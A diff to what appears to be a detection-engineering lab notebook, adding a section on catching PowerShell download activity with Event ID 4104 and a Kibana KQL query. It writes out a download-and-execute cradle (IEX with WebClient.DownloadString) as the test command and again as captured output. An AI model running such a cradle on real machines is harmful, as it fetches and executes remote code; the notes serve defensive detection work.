@@ -101,3 +101,37 @@ and powershell.file.script_block_text: *ExecutionPolicy*
 - Detect PowerShell download activity (DownloadString / Invoke-WebRequest)
 - Build Kibana alert rules for suspicious command execution
 - Expand detection coverage for common attack techniques
+
+- ---
+
+### 🔹 PowerShell Download Detection (WebClient)
+
+Test Command:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString("https://example.com")
+```
+
+Observed Behavior:
+- PowerShell downloaded remote content and executed it dynamically in memory
+
+Detection:
+- Event ID: 4104 captured the full command
+- Script block shows:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString("https://example.com")
+```
+
+Detection Query:
+```kql
+event.dataset: "windows.powershell_operational"
+and event.code: 4104
+and (
+  powershell.file.script_block_text: *DownloadString*
+  or powershell.file.script_block_text: *WebClient*
+)
+```
+
+---
+
+
